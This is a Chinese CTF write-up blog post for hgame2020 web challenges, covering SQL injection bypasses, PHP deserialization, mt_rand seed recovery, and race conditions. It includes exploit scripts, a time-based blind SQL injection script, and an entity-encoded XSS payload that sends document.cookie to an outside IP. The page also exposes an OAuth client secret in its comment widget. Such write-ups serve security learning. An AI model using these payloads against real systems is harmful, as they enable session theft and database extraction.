<!DOCTYPE html>

<html lang="zh-CN">

<head>
    
    <title>hgame2020 - M1N&#39;s Blog</title>
    <meta charset="UTF-8">
    <meta name="description" content="M1N的博客">
    <meta name="keywords" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    

    <link rel="shortcut icon" href="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png" />
    <meta name="description" content="https:&#x2F;&#x2F;hgame.vidar.club&#x2F;#&#x2F;challenge&#x2F;list">
<meta property="og:type" content="article">
<meta property="og:title" content="hgame2020">
<meta property="og:url" content="http://blog.m1n.me/2020/02/05/hgame2020/index.html">
<meta property="og:site_name" content="M1N&#39;s Blog">
<meta property="og:description" content="https:&#x2F;&#x2F;hgame.vidar.club&#x2F;#&#x2F;challenge&#x2F;list">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png">
<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png">
<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png">
<meta property="article:published_time" content="2020-02-05T15:09:06.000Z">
<meta property="article:modified_time" content="2020-02-14T05:37:17.678Z">
<meta property="article:author" content="M1N">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
    <link rel="stylesheet" href="/css/style.css?v=1632155308704">
     
    
    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1632155308704">
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="mdui-drawer-body-left">
    
    <div id="nexmoe-background">
        <div class="nexmoe-bg" style="background-image: url(https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/4.jpg)"></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="M1N" class="mdui-btn mdui-btn-icon"><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" alt="M1N"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="M1N">
            <img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" alt="M1N" alt="M1N">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>8</div>
        <div><span>标签</span>0</div>
        <div><span>分类</span>4</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://cn.bing.com/search?q=site:m1n.me" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://github.com/m1nme/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
    
    
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Bypass/">Bypass</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/SQL-Injection/">SQL注入</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Writeup/">Writeup</a>
          <span class="category-list-count">4</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/文件上传/">文件上传</a>
          <span class="category-list-count">2</span>
        </li>

        
      </ul>

    </div>
  </div>


    
    
    
</aside>
    <div class="nexmoe-copyright">
        &copy; 2021 M1N
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer -->
    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
            <div class="nexmoe-post">

  <article>
      
          <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
              <img data-src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/7.jpg" data-sizes="auto" alt="hgame2020" class="lazyload">
              <h1>hgame2020</h1>
          </div>
      
      
      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
    <a><i class="nexmoefont icon-calendar-fill"></i>2020年02月05日</a>
    <a><i class="nexmoefont icon-areachart"></i>1.7k 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 8 分钟</a>
</div>

      

      <p><a target="_blank" rel="noopener" href="https://hgame.vidar.club/#/challenge/list">https://hgame.vidar.club/#/challenge/list</a></p>
<span id="more"></span>

<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="Cosmos的博客"><a href="#Cosmos的博客" class="headerlink" title="Cosmos的博客"></a>Cosmos的博客</h2><p>刚开始拿到题目提示说git源码泄露，就用githack把源码扫了下来，但是看了半天没有什么东西，后来看了WP才知道直接去git上找历史提交记录，emmmmm</p>
<h2 id="接头霸王"><a href="#接头霸王" class="headerlink" title="接头霸王"></a>接头霸王</h2><p>考察知识点</p>
<ol>
<li>referer</li>
<li>X-Forwarded-For</li>
<li>UA</li>
<li>请求方式</li>
<li>最后一个也是之前没见过的时间，If-Unmodified-Since，格式If-Unmodified-Since:Tue, 26 Jan 2064 00:00:00 GMT</li>
</ol>
<h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><p>访问发现403，查看源代码发现提示302跳转，就直接访问index.php并且抓包改一下请求方式，然后提示令a=10，题目又提示a=b+c，就用payload?a=1+9,但是还要url编码一下，不然+会变成空格</p>
<h2 id="鸡尼泰玫"><a href="#鸡尼泰玫" class="headerlink" title="鸡尼泰玫"></a>鸡尼泰玫</h2><p>提示分数要60000以上，抓包改一下就好了</p>
<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="Cosmos博客的后台"><a href="#Cosmos博客的后台" class="headerlink" title="Cosmos博客的后台"></a>Cosmos博客的后台</h2><p>访问看到登陆界面，刚开始以为是sql注入，弄半天不行，忘记了提示只用了HTML和PHP，然后直接访问发现有?action=login.php，应该可以用php为协议读源码，因此拿到了login.php和admin.php的源码<br>在login.php中发现debug可以读取任意变量，读取一下username和password然后$admin_password又是固定的，读取发现是oe开头的（保存一个0e开头的MD5值和原值以便不时之需s878926199a/<br>0e545993274517709034328855841020），这样就可以突破登陆，就来到了admin.php页面，读源码发现用CSRF和file伪协议拿到flag，payload：file://localhost/flag</p>
<h2 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h2><p>用单引号闭合回显不一样，存在sql<br>注入点，发现过滤了空格还有select，空格可以用/**/绕过，select可以双写绕过。但是这里的#要url编码成%23，不然过不去 ，一直卡在这里，然后就是熟悉的拿flag环节</p>
<h2 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h2><p>访问mycode拿到源码，就是一层又一层的加密，，按照加密步骤解密就好了。由于token会实时刷新，这里用py脚本跑一下就好了</p>
<h2 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h2><p>提示必须管理员的token才能拿flag，结合题目看应该是考察XSS拿cookie。然后开始测试过滤，发现过滤了&lt;，但是可以通过HTML实体编码绕过，构造payload，（这里放一个拿cookie并且登陆的总结文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/lhh134/article/details/86477305%E4%BB%A5%E4%BE%BF%E6%97%A5%E5%90%8E%E5%BF%98%E8%AE%B0%EF%BC%89">https://blog.csdn.net/lhh134/article/details/86477305以便日后忘记）</a><br>然后用payload：<code>&lt;svg/onload=&quot;&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x34;&amp;#x37;&amp;#x2e;&amp;#x39;&amp;#x36;&amp;#x2e;&amp;#x32;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x32;&amp;#x31;&amp;#x36;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;&quot;</code>拿到了token<br>/?token=f802788a02a51f9c624bb5d91815b，访问flag页面，改一下token就拿到了flag</p>
<h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h2><p>先查看源代码发现source.zip，拿到源码，初步看一下应该是PHP反序列化的题目，先看一下game.php发现</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$game</span>-&gt;rank-&gt;Get() === <span class="hljs-number">1</span>)&#123;<span class="hljs-meta">?&gt;</span></span><span class="xml"></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>hgame&#123;flag_is_here&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml">    </span><span class="php"><span class="hljs-meta">&lt;?php</span> &#125;<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>于是找一下game类，其中rank在__construct方法中，新建的Rank类，而Rank类中的rank由__construct方法创建，来自session或者直接随机，也就是说可以让rank=1，但是发现有__destruct方法来判断Rank类是不是服务器定义的，但是这里可以利用construct函数定义$this-&gt;key = &amp;$this-&gt;severKey来绕过，接下来就是找反序列化的点，发现在Monster类中存在反序列化的点，但是是通过cookie的方式传入的，也就是说我们要想办法构造符合的cookie来将payload传入，这里就需要知道encryptKey是多少，而encryptKey是由参数传入的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = [<span class="hljs-variable">$playerName</span>, <span class="hljs-keyword">$this</span>-&gt;encryptKey];<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="hljs-keyword">$this</span>-&gt;welcomeMsg, <span class="hljs-variable">$value</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;sign .= md5(<span class="hljs-keyword">$this</span>-&gt;sign . <span class="hljs-variable">$value</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>其中foreach用法：<br><img data-fancybox="gallery" data-sizes="auto" data-src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png" alt="1" class="lazyload"><br>以及sprintf用法：<br><img data-fancybox="gallery" data-sizes="auto" data-src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png" alt="2" class="lazyload"><br>也就是说我们可以通过将playername赋值为%s就可以循环的将第二个值输出，拿到encryptKey。<br>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Rank</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rank</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$serverKey</span>;     <span class="hljs-comment">// 服务器的 Key</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;key = &amp;<span class="hljs-keyword">$this</span>-&gt;serverKey;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Rank();<br><span class="hljs-variable">$encryptKey</span> = <span class="hljs-string">&quot;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&quot;</span>;<br><span class="hljs-variable">$playername</span> = <span class="hljs-string">&quot;%s&quot;</span>;<br><span class="hljs-variable">$data</span> = [<span class="hljs-variable">$playername</span>, <span class="hljs-variable">$encryptKey</span>];<br><span class="hljs-variable">$sign</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-variable">$sign</span> .= md5(<span class="hljs-variable">$sign</span> . <span class="hljs-variable">$value</span>);<br>&#125;<br><br><span class="hljs-variable">$sign</span> = md5(serialize(<span class="hljs-variable">$a</span>) . <span class="hljs-variable">$sign</span>);<br><br><span class="hljs-variable">$sign</span> = base64_encode(serialize(<span class="hljs-variable">$a</span>) . <span class="hljs-variable">$sign</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sign</span>;<br></code></pre></td></tr></table></figure>
<p>改一下cookie就拿到了flag</p>
<h2 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h2><p>打开题目一脸懵逼，不知道在干什么，也不知道要干什么，看了WP才知道好像是要通过生成的随机数来还原seed，难怪图片说赶快交出种子。。有两种方法可以拿到seed，一种是通过得知</p>
<ol>
<li>从mt_rand()获取2个值：R000以及R227，中间间隔226个值；此外还需知道R000之前已生成的值的个数（用i表示）；</li>
<li>根据这些值算出加扰状态值；</li>
<li>异或这些状态值，推测出原始的状态值（s228）；</li>
<li>根据s228，推测出s0，获取种子。<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/196831">https://www.anquanke.com/post/id/196831</a><br>还有一种是通过php的php_mt_seed函数直接爆破seed<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a></li>
</ol>
<p>放一个网上的exp：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br>import os<br>s = requests<span class="hljs-selector-class">.session</span>()<br>url = <span class="hljs-string">&quot;https://twoshot.hgame.n3ko.co/random.php?times=228&quot;</span><br>cookie = &#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;lf08on0tsqpggqqvulpsg278h1&#x27;</span>&#125;<br>c = s<span class="hljs-selector-class">.get</span>(url,cookies = cookie)<br>ans = str(c.text)<br>ans = eval(ans)<br>R0 = ans<span class="hljs-selector-attr">[0]</span><br>R227 = ans<span class="hljs-selector-attr">[227]</span><br>req = <span class="hljs-string">&#x27;python reverse_mt_rand.py &#x27;</span>+str(R0)+<span class="hljs-string">&#x27; &#x27;</span>+str(R227)+<span class="hljs-string">&#x27; 0 0&#x27;</span><br><span class="hljs-selector-tag">p</span> = os<span class="hljs-selector-class">.popen</span>(req)<br>x = <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.read</span>()<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.close</span>()<br>x = str(x<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))<br>url2 = <span class="hljs-string">&quot;https://twoshot.hgame.n3ko.co/verify.php&quot;</span><br>data = &#123;<span class="hljs-string">&quot;ans&quot;</span>:x&#125;<br>final = s<span class="hljs-selector-class">.post</span>(url = url2,cookies = cookie,data = data)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(final.text)</span></span><br><br></code></pre></td></tr></table></figure>

<h2 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h2><p>条件竞争的题目，用burp发包，买入比卖出少一些，刷余额</p>
<h2 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h2><p>发现删除留言部分存在sql注入，由于没有回显，只能盲注<br><img data-fancybox="gallery" data-sizes="auto" data-src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png" alt="3" class="lazyload"></p>
<p>时间盲注脚本：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br>import time<br><br>url = &quot;http://139.199.182.61:19999/index.php?method=<span class="hljs-keyword">delete</span>&amp;delete_id=<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">test = &quot;</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">schema = &quot;</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>schema_name<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.schemata<span class="hljs-comment">/**/</span><span class="hljs-keyword">limit</span><span class="hljs-comment">/**/</span><span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">table = &quot;</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">/**/</span><span class="hljs-keyword">limit</span><span class="hljs-comment">/**/</span><span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">column = &quot;</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&#x27;user&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">limit</span><span class="hljs-comment">/**/</span><span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">data = &quot;</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>concat_ws(<span class="hljs-number">0x5e</span>,name,<span class="hljs-keyword">password</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>babysql.<span class="hljs-keyword">user</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">limit</span><span class="hljs-comment">/**/</span><span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">result = &quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">cookie = &#123;&#x27;PHPSESSID&#x27;:&#x27;9g4b91gspvooe2up4k2blubbqo&#x27;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">for i in range(1,20):</span><br><span class="hljs-string">	for j in range(33,127):</span><br><span class="hljs-string">		payload = url + &quot;</span><span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>((&#123;&#125;),&#123;&#125;,<span class="hljs-number">1</span>))=&#123;&#125;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<span class="hljs-string">&quot;.format(data,i,j)</span><br><span class="hljs-string">		print(chr(j))</span><br><span class="hljs-string">		t1 = time.time()</span><br><span class="hljs-string">		r = requests.get(payload,cookies = cookie)</span><br><span class="hljs-string">		t2 = time.time()</span><br><span class="hljs-string">		if(t2-t1&gt;=5):</span><br><span class="hljs-string">			result+=chr(j)</span><br><span class="hljs-string">			print(result)</span><br><span class="hljs-string">			break</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<p>拿到账号密码，但是登陆提示错误，不知道是什么原因，多跑几次才拿到了正确的账号密码：cosmos^f1FXOCnj26Fkadzt4Sqynf6O7CgR</p>

  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>本文作者：</strong>M1N<br>
        <strong>本文链接：</strong><a href="http://blog.m1n.me/2020/02/05/hgame2020/" title="http:&#x2F;&#x2F;blog.m1n.me&#x2F;2020&#x2F;02&#x2F;05&#x2F;hgame2020&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;blog.m1n.me&#x2F;2020&#x2F;02&#x2F;05&#x2F;hgame2020&#x2F;</a><br>
        
            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
    
        <a class="nexmoefont icon-appstore-fill -link" href="/categories/Writeup/">Writeup</a>
    
    
</div>

  
      <div class="nexmoe-post-footer">
          <section class="nexmoe-comment">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css">
<div id="gitalk"></div>
<script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '80b2453b6d5f37ad6225',
        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
        id: window.location.pathname,
        repo: 'm1nme.github.io',
        owner: 'm1nme',
        admin: 'm1nme'
    })
    gitalk.render('gitalk')
</script>
</section>
      </div>
  
</div>
            <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                              <button class="mdui-fab catalog" style="overflow:unset;">
                                  <i class="nexmoefont icon-i-catalog"></i>
                                  <div class="nexmoe-toc">
                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#week1"><span class="toc-number">1.</span> <span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos%E7%9A%84%E5%8D%9A%E5%AE%A2"><span class="toc-number">1.1.</span> <span class="toc-text">Cosmos的博客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A5%E5%A4%B4%E9%9C%B8%E7%8E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">接头霸王</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-World"><span class="toc-number">1.3.</span> <span class="toc-text">Code World</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B8%A1%E5%B0%BC%E6%B3%B0%E7%8E%AB"><span class="toc-number">1.4.</span> <span class="toc-text">鸡尼泰玫</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#week2"><span class="toc-number">2.</span> <span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%90%8E%E5%8F%B0"><span class="toc-number">2.1.</span> <span class="toc-text">Cosmos博客的后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1"><span class="toc-number">2.2.</span> <span class="toc-text">Cosmos的留言板-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos%E7%9A%84%E6%96%B0%E8%AF%AD%E8%A8%80"><span class="toc-number">2.3.</span> <span class="toc-text">Cosmos的新语言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos%E7%9A%84%E8%81%8A%E5%A4%A9%E5%AE%A4"><span class="toc-number">2.4.</span> <span class="toc-text">Cosmos的聊天室</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#week3"><span class="toc-number">3.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BA%89-Ordinal-Scale"><span class="toc-number">3.1.</span> <span class="toc-text">序列之争 - Ordinal Scale</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8F%91%E5%85%A5%E9%AD%82"><span class="toc-number">3.2.</span> <span class="toc-text">二发入魂</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos%E7%9A%84%E4%BA%8C%E6%89%8B%E5%B8%82%E5%9C%BA"><span class="toc-number">3.3.</span> <span class="toc-text">Cosmos的二手市场</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-2"><span class="toc-number">3.4.</span> <span class="toc-text">Cosmos的留言板-2</span></a></li></ol></li></ol>
                                  </div>
                              </button>
                          
                          
                      
                    
